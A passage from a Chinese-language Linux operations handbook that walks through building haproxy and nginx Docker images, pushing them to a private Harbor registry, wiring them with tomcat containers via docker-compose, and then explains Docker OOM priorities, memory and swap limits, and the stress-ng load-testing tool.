Step 4/8 : RUN cd /usr/local/src/haproxy-2.1.2     && make ARCH=x86_64 
TARGET=linux-glibc USE_PCRE=1 USE_OPENSSL=1 USE_ZLIB=1 USE_SYSTEMD=1
USE_CPU_AFFINITY=1 PREFIX=/apps/haproxy     && make install PREFIX=/apps/haproxy 
    && ln -s /apps/haproxy/sbin/haproxy /usr/sbin/     && mkdir
/apps/haproxy/run     && rm -rf /usr/local/src/haproxy*
---> Using cache
---> 014f0f0b3569
Step 5/8 : ADD haproxy.cfg /etc/haproxy/
---> Using cache
---> 878e8db33c8d
Step 6/8 : ADD run_haproxy.sh /usr/bin
---> Using cache
---> 1177ed360989
Step 7/8 : EXPOSE 80 9999
---> Using cache
---> 8c2c602c1a56
Step 8/8 : CMD ["run_haproxy.sh"]
---> Using cache
---> 03e8086d441d
Successfully built 03e8086d441d
Successfully tagged 10.0.0.102/example/haproxy-centos7-base:2.1.2
The push refers to repository [10.0.0.102/example/haproxy-centos7-base]
fea7d7539b84: Layer already exists 
118f303dfb57: Layer already exists 
2748cd88bb93: Layer already exists 
a5dbda9ecfbf: Layer already exists 
2073413aebd6: Layer already exists 
6ec9af97c369: Layer already exists 
034f282942cd: Layer already exists 
2.1.2: digest: 
sha256:5df06247a5bd187894dd1c705f374568ecb4996e8d38bea71fd0bc679ab6ae13 size: 1785
```

##### 48.10.5.2 制作nginx镜像

**准备Dockfile文件**

```
[root@ubuntu1804 ~]#cat /data/dockerfile/web/nginx/1.16.1-centos7-base/Dockerfile 
FROM centos7-base:v1
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
ADD nginx-1.16.1.tar.gz /usr/local/src
RUN cd /usr/local/src/nginx-1.16.1 \
   && ./configure --prefix=/apps/nginx \
   && make && make install \
   && rm -rf /usr/local/src/nginx-1.16.1*     \
   && useradd -r -s /sbin/nologin nginx 
COPY nginx.conf /apps/nginx/conf/
ADD app.tar.gz /apps/nginx/html/
EXPOSE 80 443
CMD ["/apps/nginx/sbin/nginx"]
```

**准备nginx配置文件**

```
[root@ubuntu1804 ~]#cat /data/dockerfile/web/nginx/1.16.1-centos7-base/nginx.conf
user nginx;
worker_processes  1;
daemon off;
events {
   worker_connections  1024;
}
http {
   upstream tomcat {
       server service-tomcat-app1:8080;  #service-tomcat-app1为docker-compse.yml指定的名称
       server service-tomcat-app2:8080;
      }
   include       mime.types;
   default_type application/octet-stream;
   sendfile       on;
   keepalive_timeout  65;
   server {
       listen       80;
       server_name localhost;
       location / {
           root   html;
           index index.html index.htm;
       }
       location /app {
           proxy_pass http://tomcat ;
       }
       error_page   500 502 503 504 /50x.html;
       location = /50x.html {
           root   html;
       }
   }
}
```

**镜像build和上传harbor的脚本**

```
[root@ubuntu1804 ~]#cat /data/dockerfile/web/nginx/1.16.1-centos7-base/build.sh 
#!/bin/bash
docker build -t 10.0.0.102/example/nginx-centos7-base:1.6.1 . 
docker push 10.0.0.102/example/nginx-centos7-base:1.6.1
```

**准备软件包和其它文件**

```
[root@ubuntu1804 ~]#tree /data/dockerfile/web/nginx/1.16.1-centos7-base/
/data/dockerfile/web/nginx/1.16.1-centos7-base/
├── app.tar.gz
├── build.sh
├── Dockerfile
├── nginx-1.16.1.tar.gz
└── nginx.conf

0 directories, 5 files
```

**执行构建镜像并上传harbor**

```
[root@ubuntu1804 ~]#cd /data/dockerfile/web/nginx/1.16.1-centos7-base/
[root@ubuntu1804 1.16.1-centos7-base]#bash build.sh 
Sending build context to Docker daemon  1.041MB
Step 1/8 : FROM centos7-base:v1
---> 34ab3afcd3b3
Step 2/8 : LABEL maintainer="wangxiaochun <root@wangxiaochun.com>"
---> Using cache
---> 6206742174bc
Step 3/8 : ADD nginx-1.16.1.tar.gz /usr/local/src
---> Using cache
---> 1c2d1cbbf34d
Step 4/8 : RUN cd /usr/local/src/nginx-1.16.1     && ./configure --
prefix=/apps/nginx     && make && make install     && rm -rf
/usr/local/src/nginx-1.16.1*         && useradd -r -s /sbin/nologin nginx
---> Using cache
---> 019823fa30bf
Step 5/8 : COPY nginx.conf /apps/nginx/conf/
---> Using cache
---> 9583c76d6c9d
Step 6/8 : ADD app.tar.gz /apps/nginx/html/
---> Using cache
---> 4bc0528bb32e
Step 7/8 : EXPOSE 80 443
---> Using cache
---> 547fb553f9d9
Step 8/8 : CMD ["/apps/nginx/sbin/nginx"]
---> Using cache
---> f6aa9591a2b0
Successfully built f6aa9591a2b0
Successfully tagged 10.0.0.102/example/nginx-centos7-base:1.6.1
The push refers to repository [10.0.0.102/example/nginx-centos7-base]
4591f99cd5a6: Layer already exists 
27bdf47a2126: Layer already exists 
6aa26a3d91e1: Layer already exists 
93ae7d74d90e: Layer already exists
2073413aebd6: Layer already exists 
6ec9af97c369: Layer already exists 
034f282942cd: Layer already exists 
1.6.1: digest: 
sha256:2eb7525c623ecf34bc2046888029cdb0ef01d866a0687ca7afd4dfd36c16a863 size: 1786
```

##### 48.10.5.3 制作tomcat镜像

```
此处略，参考48.6.3.4.4小节
```


**参考下面文件列表:** 

```
[root@ubuntu1804 ~]#tree /data/dockerfile/
/data/dockerfile/
├── system
│   ├── alpine
│   │   ├── build.sh
│   │   ├── Dockerfile
│   │   └── repositories
│   ├── centos
│   │   ├── build.sh
│   │   └── Dockerfile
│   ├── debian
│   └── ubuntu
└── web
   ├── apache
   ├── haproxy
   │   └── 2.1.2-centos7-base
   │       ├── build.sh
   │       ├── Dockerfile
   │       ├── haproxy-2.1.2.tar.gz
   │       ├── haproxy.cfg
   │       └── run_haproxy.sh
   ├── jdk
   │   ├── build.sh
   │   ├── Dockerfile
   │   ├── jdk-8u212-linux-x64.tar.gz
   │   └── profile
   ├── nginx
   │   ├── 1.16.1-alpine
   │   │   ├── build.sh
   │   │   ├── Dockerfile
   │   │   ├── index.html
   │   │   ├── nginx-1.16.1.tar.gz
   │   │   └── nginx.conf
   │   ├── 1.16.1-centos7
   │   │   ├── build.sh
   │   │   ├── Dockerfile
   │   │   ├── index.html
   │   │   ├── nginx-1.16.1.tar.gz
   │   │   └── nginx.conf
   │   ├── 1.16.1-centos7-base
   │   │   ├── app.tar.gz
   │   │   ├── build.sh
   │   │   ├── Dockerfile
   │   │   ├── nginx-1.16.1.tar.gz
   │   │   └── nginx.conf
   │   └── 1.16.1-ubuntu1804
   │       ├── build.sh
   │       ├── Dockerfile
   │       ├── index.html
   │       ├── nginx-1.16.1.tar.gz
   │       ├── nginx.conf
   │       └── sources.list
   └── tomcat
       ├── tomcat-app1
       │   ├── app
       │   │   └── index.jsp
       │   ├── app.tar.gz
       │   ├── build.sh
       │   ├── Dockerfile
       │   ├── run_tomcat.sh
       │   └── server.xml
       ├── tomcat-app2
       │   ├── app
       │   │   ├── index.html
       │   │   └── index.jsp
       │   ├── app.tar.gz
       │   ├── build.sh
       │   ├── Dockerfile
       │   ├── run_tomcat.sh
       │   └── server.xml
       └── tomcat-base-8.5.50
           ├── apache-tomcat-8.5.50.tar.gz
           ├── build.sh
           └── Dockerfile
           
21 directories, 51 files
```

##### 48.10.5.4 查看harbor上的相关镜像

![1660546183343](linux体系.assets/1660546217048.png)

##### 48.10.5.5 编辑docker compose文件及环境准备

**编辑docker compose文件**

```
[root@ubuntu1804 ~]#cat /data/docker-compose/docker-compose.yml 
service-haproxy:
 image: 10.0.0.102/example/haproxy-centos7-base:2.1.2
 container_name: haproxy
 expose:
    - 80
    - 9999
 ports:
    - "80:80"
    - "9999:9999"
 links:
    - service-nginx-web
    
service-nginx-web:
 image: 10.0.0.102/example/nginx-centos7-base:1.6.1
 container_name: nginx-web 
 volumes:
    - /data/nginx:/apps/nginx/html/
 links:
    - service-tomcat-app1
    - service-tomcat-app2
 expose:
   - 80
   - 443
# ports:
#   - "80:80"
#   - "443:443"

service-tomcat-app1:
 image: 10.0.0.102/example/tomcat-web:app1
 container_name: tomcat-app1
 expose:
    - 8080
# ports:
#   - "8081:8080"

service-tomcat-app2:
 image: 10.0.0.102/example/tomcat-web:app2
 container_name: tomcat-app2
 expose:
    - 8080
# ports:
#   - "8082:8080"
```

**启动容器**

```
[root@ubuntu1804 ~]#cd /data/docker-compose/
[root@ubuntu1804 docker-compose]#docker-compose up -d 
Pulling service-tomcat-app1 (10.0.0.102/example/tomcat-web:app1)...
app1: Pulling from example/tomcat-web
f34b00c7da20: Pull complete
544476d462f7: Pull complete
39345915aa1b: Pull complete
4b792f2bae38: Pull complete
4439447a3522: Pull complete
fe34d2ec1dd0: Pull complete
b8487ca03126: Pull complete
5a475b7d8b1a: Pull complete
df8703d3d2dd: Pull complete
f0da1ffa7aa7: Pull complete
80fd4c70e670: Pull complete
c2a0247d7bfa: Pull complete
b0977ed809cd: Pull complete
Digest: sha256:e0aba904df6095ea04c594d6906101f8e5f4a6ceb0a8f9b24432c47698d0caa8
Status: Downloaded newer image for 10.0.0.102/example/tomcat-web:app1
Pulling service-tomcat-app2 (10.0.0.102/example/tomcat-web:app2)...
app2: Pulling from example/tomcat-web
f34b00c7da20: Already exists
544476d462f7: Already exists
39345915aa1b: Already exists
4b792f2bae38: Already exists
4439447a3522: Already exists
fe34d2ec1dd0: Already exists
b8487ca03126: Already exists
5a475b7d8b1a: Already exists
df8703d3d2dd: Already exists
f0da1ffa7aa7: Already exists
80fd4c70e670: Already exists
1a55cb76a801: Pull complete
565ab795f82a: Pull complete
Digest: sha256:c4d6f166c3933f6c1ba59c84ea0518ed653af25f28b87981c242b0deff4209bb
Status: Downloaded newer image for 10.0.0.102/example/tomcat-web:app2
Pulling service-nginx-web (10.0.0.102/example/nginx-centos7-base:1.6.1)...
1.6.1: Pulling from example/nginx-centos7-base
f34b00c7da20: Already exists
544476d462f7: Already exists
39345915aa1b: Already exists
cf9a24457402: Pull complete
15ef14db18ed: Pull complete
fc0bcf215997: Pull complete
2808e0476ed2: Pull complete
Digest: sha256:2eb7525c623ecf34bc2046888029cdb0ef01d866a0687ca7afd4dfd36c16a863
Status: Downloaded newer image for 10.0.0.102/example/nginx-centos7-base:1.6.1
Pulling service-haproxy (10.0.0.102/example/haproxy-centos7-base:2.1.2)...
2.1.2: Pulling from example/haproxy-centos7-base
f34b00c7da20: Already exists
544476d462f7: Already exists
39345915aa1b: Already exists
70a1e528112f: Pull complete
d240b62890cd: Pull complete
4223b7054cb3: Pull complete
7d2e1b713699: Pull complete
Digest: sha256:5df06247a5bd187894dd1c705f374568ecb4996e8d38bea71fd0bc679ab6ae13
Status: Downloaded newer image for 10.0.0.102/example/haproxy-centos7-base:2.1.2
Creating tomcat-app1 ... done
Creating tomcat-app2 ... done
Creating nginx-web   ... done
Creating haproxy     ... done



[root@ubuntu1804 docker-compose]#curl 127.0.0.1/app/
Tomcat Page in app1
[root@ubuntu1804 docker-compose]#curl 127.0.0.1/app/
Tomcat Page in app2
[root@ubuntu1804 docker-compose]#curl 127.0.0.1
Docker compose test page
```

**验证容器启动成功**

```
[root@ubuntu1804 ~]#curl http://10.0.0.101/
Docker compose test page
[root@ubuntu1804 ~]#curl http://10.0.0.101/app/
Tomcat Page in app1
[root@ubuntu1804 ~]#curl http://10.0.0.101/app/
Tomcat Page in app2
```

### 48.11 docker的资源限制

#### 48.11.1 OOM(内存溢出)

```
对于Linux主机，如果没有足够的内存来执行其他重要的系统任务，将会抛出OOM (Out of Memory Exception,内存溢出、内存泄漏、内存异常 )，随后系统会开始杀死进程以释放内存， 凡是运行在宿主机的进程都有可能被 kill ，包括 Dockerd和其它的应用程序， 如果重要的系统进程被 Kill，会导致和该进程相关的服务全部宕机。通常越消耗内存比较大的应用越容易被kill，比如: MySQL数据库，Java程序等。



产生OOM异常时， Dockerd尝试通过调整 Docker 守护程序上的 OOM 优先级来减轻这些风险，以便它比系统上的其他进程更不可能被杀死但是容器 的 OOM 优先级未调整， 这使得单个容器被杀死的可能性比 Docker守护程序或其他系统进程被杀死的可能性更大，不推荐通过在守护程序或容器上手动设置-- oom -score-adj为极端负数，或通过在容器上设置 -- oom-kill-disable来绕过这些安全措施。
```

**OOM 优先级机制:** 

```
#linux会为每个进程算一个分数，最终将分数最高的kill
/proc/PID/oom_score_adj 
#范围为 -1000 到 1000，值越高容易被宿主机 kill掉，如果将该值设置为 -1000 ，则进程永远不会被宿主机 kernel kill 


/proc/PID/oom_adj 
#范围为 -17 到+15 ，取值越高越容易被干掉，如果是 -17 ， 则表示不能被 kill ，该设置参数的存在是为了和旧版本的Linux内核兼容。


/proc/PID/oom_score 
#这个值是系统综合进程的内存消耗量、 CPU 时间 (utime + 存活时间 (uptime - start time) 和oom_adj 计算出的进程得分 ，消耗内存越多得分越高，容易被宿主机kernel强制杀死。
```

**范例: 查看OOM相关值**

```
#按内存排序
[root@ubuntu1804 ~]#top
top - 20:15:38 up  5:53,  3 users, load average: 0.00, 0.00, 0.00
Tasks: 191 total,   1 running, 116 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  0.3 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem :   985104 total,   310592 free,   448296 used,   226216 buff/cache
KiB Swap:  1951740 total,  1892860 free,    58880 used.   384680 avail Mem 
   PID USER     PR NI   VIRT   RES   SHR S %CPU %MEM     TIME+ COMMAND
   19674 2019      20   0 2241656  94684  12452 S  0.0  9.6   0:16.05 java         
                                                    
19675 2019      20   0 2235512  74816  12440 S  0.0  7.6   0:14.89 java         
                                                    
19860 99        20   0  183212  67748    960 S  0.0  6.9   0:01.15 haproxy     
                                                     
  4969 root      20   0  937880  49352  12612 S  0.0  5.0   0:46.07 dockerd     
                                                     
  2981 root      20   0  793072  13552   1808 S  0.0  1.4   0:13.78 containerd   
                                                    
   500 root      19  -1   78560   7552   7112 S  0.0  0.8   0:01.45 systemdjournal                                                  
   798 root      20   0  170416   6604   4084 S  0.0  0.7   0:00.77 networkddispat                                                  
     1 root      20   0   78036   6200   4416 S  0.0  0.6   0:05.39 systemd     
                                                     
  1011 root      20   0   24548   5496   3012 S  0.0  0.6   0:01.62 bash         
                                                    
   852 root      10 -10   25880   5264   4036 S  0.0  0.5   0:00.00 iscsid       
                                                    
   815 root      20   0  548292   4624   1224 S  0.0  0.5   0:01.89 snapd       
                                                     
19586 root      20   0  109104   4532   3768 S  0.0  0.5   0:00.29 containerdshim                                                  
19779 root      20   0  405532   4224   2828 S  0.0  0.4   0:00.01 docker-proxy 
                                                    
19784 root      20   0  107696   4204   3652 S  0.0  0.4   0:00.29 containerdshim                                                  
19424 root      20   0  109104   4084   3416 S  0.0  0.4   0:00.27 containerdshim                                                  
20064 root      20   0   44076   4036   3360 R  0.7  0.4   0:00.20 top         
                                                     
19768 root      20   0  405532   4024   2644 S  0.0  0.4   0:00.01 docker-proxy 
                                                    
19423 root      20   0  109104   3792   3064 S  0.0  0.4   0:00.31 containerdshim                                                  
   490 root      20   0  193112   3316   2864 S  0.0  0.3   0:26.20 vmtoolsd     
                                                    
  7108 root      20   0  105688   3204   2504 S  0.0  0.3   0:00.11 sshd
  
  
  
[root@ubuntu1804 ~]#cat /proc/19674/oom_adj 
0
[root@ubuntu1804 ~]#cat /proc/19674/oom_score
32
[root@ubuntu1804 ~]#cat /proc/19674/oom_score_adj 
0
[root@ubuntu1804 ~]#cat /proc/7108/oom_adj 
0
[root@ubuntu1804 ~]#cat /proc/7108/oom_score
1
[root@ubuntu1804 ~]#cat /proc/7108/oom_score_adj 
0



#docker服务进程的OOM默认值
[root@ubuntu1804 ~]#cat /proc/`pidof dockerd`/oom_adj
-8
[root@ubuntu1804 ~]#cat /proc/`pidof dockerd`/oom_score
0
[root@ubuntu1804 ~]#cat /proc/`pidof dockerd`/oom_score_adj
-500
```

#### 48.11.2 容器的内存限制

```
Docker 可以强制执行硬性内存限制，即只允许容器使用给定的内存大小。
Docker 也可以执行非硬性内存限制，即容器可以使用尽可能多的内存，除非内核检测到主机上的内存不够用了。
```

##### 48.11.2.1 内存相关选项

官文文档: https://docs.docker.com/config/containers/resource_constraints/

|         选项          |                             描述                             |
| :-------------------: | :----------------------------------------------------------: |
|    -m ， --memory=    | 容器可以使用的最大物理内存量，硬限制，此选项最小允许值为 4m （4 MB），此项较常用。 |
|     --memory-swap     | 允许此容器交换到磁盘的内存量,必须先用-m 对内存限制才可以使用,详 细说明如下。 |
| --memory- reservation | 允许指定小于 --memory 的软限制 ，当 Docker 检测到主机上的争用 或内存不足时会激活该限制，如果使-- memory-reservation，则必须 将其设置为低于 --memory 才能使其优先生效。 因为它是软限制，所以不能保证容器不超过限制。 |
|    --kernel-memory    | 容器可以使用的最大内核内存量，最小为 4m，由于内核内存与用户空 间内存隔离，因此无法与用户空间内存直接交换，因此内核内存不足的 容器可能会阻塞宿主机资源，这会对主机和其他容器或者其他服务进程 产生影响，因此不建议设置内核内存大小。 |
|  --memory-swappiness  | 设置容器使用交换分区的倾向性，值越高表示越倾向于使用swap分 区，范围为0-100，0为能不用就不用，100为能用就用。 |
|  --oom-kill-disable   | 默认情况下，如果发生内存不足（OOM）错误，则内核将终止容器中 的进程。要更改此行为，请使用该 --oom-kill-disable 选项。仅在设 置了该 -m/--memory 选项的容器上禁用OOM。如果 -m 未设置该标志， 则主机可能会用完内存，内核可能需要终止主机系统的进程以释放内存。 |

**范例:** 

```
[root@ubuntu1804 ~]#docker run -e MYSQL_ROOT_PASSWORD=123456 -it --rm -m 1g --oom-kill-disable mysql:5.7.29
2020-02-04 13:11:54+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL 
Server 5.7.29-1debian9 started.
2020-02-04 13:11:54+00:00 [Note] [Entrypoint]: Switching to dedicated user 
'mysql'
2020-02-04 13:11:54+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL 
Server 5.7.29-1debian9 started.
2020-02-04 13:11:54+00:00 [Note] [Entrypoint]: Initializing database files
......
Version: '5.7.29' socket: '/var/run/mysqld/mysqld.sock' port: 3306 MySQL 
Community Server (GPL）
```

**范例:** 

```
[root@ubuntu1804 ~]#sysctl -a |grep swappiness
sysctl: reading key "net.ipv6.conf.all.stable_secret"
sysctl: reading key "net.ipv6.conf.default.stable_secret"
sysctl: reading key "net.ipv6.conf.docker0.stable_secret"
sysctl: reading key "net.ipv6.conf.eth0.stable_secret"
sysctl: reading key "net.ipv6.conf.lo.stable_secret"
vm.swappiness = 60
```

##### 48.11.2.2 swap限制

```
--memory-swap #只有在设置了 --memory 后才会有意义。使用 Swap,可以让容器将超出限制部分的内存置换到磁盘上，WARNING: 经常将内存交换到磁盘的应用程序会降低性能.
```

**不同的--memory-swap 设置会产生不同的效果:** 

![1660550215444](linux体系.assets/1660550215444.png)

```
-memory-swap #值为正数， 那么--memory 和--memory-swap 都必须要设置，--memory-swap 表示你能使用的内存和 swap 分区大小的总和，例如:   --memory=300m, --memory-swap=1g, 那么该容器能够使用 300m 物理内存和 700m swap，即--memory 是实际物理内存大小值不变，而 swap 的实际大小计算方式为(--memory-swap)-(--memory)=容器可用swap。
--memory-swap #如果设置为 0，则忽略该设置，并将该值视为未设置，即未设置交换分区。
--memory-swap #如果等于--memory 的值，并且--memory 设置为正整数，容器无权访问swap 。
-memory-swap #如果未设置，如果宿主机开启了 swap，则实际容器的swap 值最大为 2x( --memory)，即两倍于物理内存大小，例如，如果--memory="300m"与--memory-swap没有设置，该容器可以使用300m总的内存和600m交撒空间,但是并不准确(在容器中使用free 命令所看到的 swap 空间并不精确，毕竟每个容器都可以看到具体大小，宿主机的 swap 是有上限的，而且不是所有容器看到的累计大小)。
--memory-swap #如果设置为-1，如果宿主机开启了 swap，则容器可以使用主机上 swap 的最大空间。
```

**注意: 在容器中执行free命令看到的是宿主机的内存和swap使用，而非容器自身的swap使用情况**

范例: 在容器中查看内存

```
[root@ubuntu1804 ~]#free 
             total       used       free     shared buff/cache   available
Mem:        3049484      278484     1352932       10384     1418068     2598932
Swap:       1951740           0     1951740



[root@ubuntu1804 ~]#docker run -it --rm -m 2G centos:centos7.7.1908 bash
[root@f5d387b5022f /]# free 
             total       used       free     shared buff/cache   available
Mem:        3049484      310312     1320884       10544     1418288     2566872
Swap:       1951740           0     1951740
```

##### 48.11.2.3 stress-ng压力测试工具

**范例: 软件包方式安装**

```
[root@centos7 ~]#yum -y install stress-ng
[root@ubuntu1804 ~]#apt -y install stress-ng
```

**范例: 容器方式安装**

```
[root@ubuntu1804 ~]#docker pull lorel/docker-stress-ng
Using default tag: latest
latest: Pulling from lorel/docker-stress-ng
Image docker.io/lorel/docker-stress-ng:latest uses outdated schema1 manifest 
format. Please upgrade to a schema2 image for better future compatibility. More 
information at https://docs.docker.com/registry/spec/deprecated-schema-v1/
c52e3ed763ff: Pull complete 
a3ed95caeb02: Pull complete 
7f831269c70e: Pull complete 
Digest: sha256:c8776b750869e274b340f8e8eb9a7d8fb2472edd5b25ff5b7d55728bca681322
Status: Downloaded newer image for lorel/docker-stress-ng:latest
docker.io/lorel/docker-stress-ng:latest

[root@ubuntu1804 ~]#docker images 
REPOSITORY               TAG                 IMAGE ID           CREATED         
    SIZE
lorel/docker-stress-ng   latest             1ae56ccafe55        3 years ago     
    8.1MB
```

**范例: 查看帮助**

```
[root@centos7 docker-compose]# docker run -it --rm lorel/docker-stress-ng
stress-ng, version 0.03.11

Usage: stress-ng [OPTION [ARG]]
 --h,  --help             show help
       --affinity N       start N workers that rapidly change CPU affinity
       --affinity-ops N   stop when N affinity bogo operations completed
       --affinity-rand    change affinity randomly rather than sequentially
       --aio N            start N workers that issue async I/O requests
       --aio-ops N        stop when N bogo async I/O requests completed
       --aio-requests N   number of async I/O requests per worker
 -a N, --all N            start N workers of each stress test
 -b N, --backoff N        wait of N microseconds before work starts
 -B N, --bigheap N        start N workers that grow the heap using calloc()
       --bigheap-ops N    stop when N bogo bigheap operations completed
       --bigheap-growth N grow heap by N bytes per iteration
       --brk N            start N workers performing rapid brk calls
       --brk-ops N        stop when N brk bogo operations completed
       --brk-notouch      don't touch (page in) new data segment page
       --bsearch          start N workers that exercise a binary search
       --bsearch-ops      stop when N binary search bogo operations completed
       --bsearch-size     number of 32 bit integers to bsearch
 -C N, --cache N          start N CPU cache thrashing workers
       --cache-ops N      stop when N cache bogo operations completed (x86 only)
       --cache-flush      flush cache after every memory write (x86 only)
       --cache-fence      serialize stores
       --class name       specify a class of stressors, use with --sequential
       --chmod N          start N workers thrashing chmod file mode bits 
       --chmod-ops N      stop chmod workers after N bogo operations
 -c N, --cpu N            start N workers spinning on sqrt(rand())
       --cpu-ops N        stop when N cpu bogo operations completed
 -l P, --cpu-load P       load CPU by P %%, 0=sleep, 100=full load (see -c)
       --cpu-method m     specify stress cpu method m, default is all
 -D N, --dentry N         start N dentry thrashing processes
       --dentry-ops N     stop when N dentry bogo operations completed
       --dentry-order O   specify dentry unlink order (reverse, forward, stride)
       --dentries N       create N dentries per iteration
       --dir N            start N directory thrashing processes
       --dir-ops N        stop when N directory bogo operations completed
 -n,   --dry-run          do not run
       --dup N            start N workers exercising dup/close
       --dup-ops N        stop when N dup/close bogo operations completed
       --epoll N          start N workers doing epoll handled socket activity
       --epoll-ops N      stop when N epoll bogo operations completed
       --epoll-port P     use socket ports P upwards
       --epoll-domain D   specify socket domain, default is unix
       --eventfd N        start N workers stressing eventfd read/writes
       --eventfd-ops N    stop eventfd workers after N bogo operations
       --fault N          start N workers producing page faults
       --fault-ops N      stop when N page fault bogo operations completed
       --fifo N           start N workers exercising fifo I/O
       --fifo-ops N       stop when N fifo bogo operations completed
       --fifo-readers N   number of fifo reader processes to start
       --flock N          start N workers locking a single file
       --flock-ops N      stop when N flock bogo operations completed
 -f N, --fork N           start N workers spinning on fork() and exit()
       --fork-ops N       stop when N fork bogo operations completed
       --fork-max P       create P processes per iteration, default is 1
       --fstat N          start N workers exercising fstat on files
       --fstat-ops N      stop when N fstat bogo operations completed
       --fstat-dir path   fstat files in the specified directory
       --futex N          start N workers exercising a fast mutex
       --futex-ops N      stop when N fast mutex bogo operations completed
       --get N            start N workers exercising the get*() system calls
       --get-ops N        stop when N get bogo operations completed
 -d N, --hdd N            start N workers spinning on write()/unlink()
       --hdd-ops N        stop when N hdd bogo operations completed
       --hdd-bytes N      write N bytes per hdd worker (default is 1GB)
       --hdd-direct       minimize cache effects of the I/O
       --hdd-dsync        equivalent to a write followed by fdatasync
       --hdd-noatime      do not update the file last access time
       --hdd-sync         equivalent to a write followed by fsync
       --hdd-write-size N set the default write size to N bytes
       --hsearch          start N workers that exercise a hash table search
       --hsearch-ops      stop when N hash search bogo operations completed
       --hsearch-size     number of integers to insert into hash table
       --inotify N        start N workers exercising inotify events
       --inotify-ops N    stop inotify workers after N bogo operations
 -i N, --io N             start N workers spinning on sync()
       --io-ops N         stop when N io bogo operations completed
       --ionice-class C   specify ionice class (idle, besteffort, realtime)
       --ionice-level L   specify ionice level (0 max, 7 min)
 -k,   --keep-name        keep stress process names to be 'stress-ng'
       --kill N           start N workers killing with SIGUSR1
       --kill-ops N       stop when N kill bogo operations completed
       --lease N          start N workers holding and breaking a lease
       --lease-ops N      stop when N lease bogo operations completed
       --lease-breakers N number of lease breaking processes to start
       --link N           start N workers creating hard links
       --link-ops N       stop when N link bogo operations completed
       --lsearch          start N workers that exercise a linear search
       --lsearch-ops      stop when N linear search bogo operations completed
       --lsearch-size     number of 32 bit integers to lsearch
 -M,   --metrics          print pseudo metrics of activity
       --metrics-brief    enable metrics and only show non-zero results
       --memcpy N         start N workers performing memory copies
       --memcpy-ops N     stop when N memcpy bogo operations completed
       --mmap N           start N workers stressing mmap and munmap
       --mmap-ops N       stop when N mmap bogo operations completed
       --mmap-async       using asynchronous msyncs for file based mmap
       --mmap-bytes N     mmap and munmap N bytes for each stress iteration
       --mmap-file        mmap onto a file using synchronous msyncs
       --mmap-mprotect    enable mmap mprotect stressing
       --msg N            start N workers passing messages using System V messages
       --msg-ops N        stop msg workers after N bogo messages completed
       --mq N             start N workers passing messages using POSIX messages
       --mq-ops N         stop mq workers after N bogo messages completed
       --mq-size N        specify the size of the POSIX message queue
       --nice N           start N workers that randomly re-adjust nice levels
       --nice-ops N       stop when N nice bogo operations completed
       --no-madvise       don't use random madvise options for each mmap
       --null N           start N workers writing to /dev/null
       --null-ops N       stop when N /dev/null bogo write operations completed
 -o,   --open N           start N workers exercising open/close
       --open-ops N       stop when N open/close bogo operations completed
 -p N, --pipe N           start N workers exercising pipe I/O
       --pipe-ops N       stop when N pipe I/O bogo operations completed
 -P N, --poll N           start N workers exercising zero timeout polling
       --poll-ops N       stop when N poll bogo operations completed
       --procfs N         start N workers reading portions of /proc
       --procfs-ops N     stop procfs workers after N bogo read operations
       --pthread N        start N workers that create multiple threads
       --pthread-ops N    stop pthread workers after N bogo threads created
       --pthread-max P    create P threads at a time by each worker
 -Q,   --qsort N          start N workers exercising qsort on 32 bit random integers
       --qsort-ops N      stop when N qsort bogo operations completed
       --qsort-size N     number of 32 bit integers to sort
 -q,   --quiet            quiet output
 -r,   --random N         start N random workers
       --rdrand N         start N workers exercising rdrand instruction (x86 only)
       --rdrand-ops N     stop when N rdrand bogo operations completed
 -R,   --rename N         start N workers exercising file renames
       --rename-ops N     stop when N rename bogo operations completed
       --sched type       set scheduler type
       --sched-prio N     set scheduler priority level N
       --seek N           start N workers performing random seek r/w IO
       --seek-ops N       stop when N seek bogo operations completed
       --seek-size N      length of file to do random I/O upon
       --sem N            start N workers doing semaphore operations
       --sem-ops N        stop when N semaphore bogo operations completed
       --sem-procs N      number of processes to start per worker
       --sendfile N       start N workers exercising sendfile
       --sendfile-ops N   stop after N bogo sendfile operations
       --sendfile-size N  size of data to be sent with sendfile
       --sequential N     run all stressors one by one, invoking N of them
       --sigfd N          start N workers reading signals via signalfd reads 
       --sigfd-ops N      stop when N bogo signalfd reads completed
       --sigfpe N         start N workers generating floating point math faults
       --sigfpe-ops N     stop when N bogo floating point math faults completed
       --sigsegv N        start N workers generating segmentation faults
       --sigsegv-ops N    stop when N bogo segmentation faults completed
 -S N, --sock N           start N workers doing socket activity
       --sock-ops N       stop when N socket bogo operations completed
       --sock-port P      use socket ports P to P + number of workers - 1
       --sock-domain D    specify socket domain, default is ipv4
       --stack N          start N workers generating stack overflows
       --stack-ops N      stop when N bogo stack overflows completed
 -s N, --switch N         start N workers doing rapid context switches
       --switch-ops N     stop when N context switch bogo operations completed
       --symlink N        start N workers creating symbolic links
       --symlink-ops N    stop when N symbolic link bogo operations completed
       --sysinfo N        start N workers reading system information
       --sysinfo-ops N    stop when sysinfo bogo operations completed
 -t N, --timeout N        timeout after N seconds
 -T N, --timer N          start N workers producing timer events
       --timer-ops N      stop when N timer bogo events completed
       --timer-freq F     run timer(s) at F Hz, range 1000 to 1000000000
       --tsearch          start N workers that exercise a tree search
       --tsearch-ops      stop when N tree search bogo operations completed
       --tsearch-size     number of 32 bit integers to tsearch
       --times            show run time summary at end of the run
 -u N, --urandom N        start N workers reading /dev/urandom
       --urandom-ops N    stop when N urandom bogo read operations completed
       --utime N          start N workers updating file timestamps
       --utime-ops N      stop after N utime bogo operations completed
       --utime-fsync      force utime meta data sync to the file system
 -v,   --verbose          verbose output
       --verify           verify results (not available on all tests)
 -V,   --version          show version
 -m N, --vm N             start N workers spinning on anonymous mmap
       --vm-bytes N       allocate N bytes per vm worker (default 256MB)
       --vm-hang N        sleep N seconds before freeing memory
       --vm-keep          redirty memory instead of reallocating
       --vm-ops N         stop when N vm bogo operations completed
       --vm-locked        lock the pages of the mapped region into memory
       --vm-method m      specify stress vm method m, default is all
       --vm-populate      populate (prefault) page tables for a mapping
       --wait N           start N workers waiting on child being stop/resumed
       --wait-ops N       stop when N bogo wait operations completed
       --zero N           start N workers reading /dev/zero
       --zero-ops N       stop when N /dev/zero bogo read operations completed

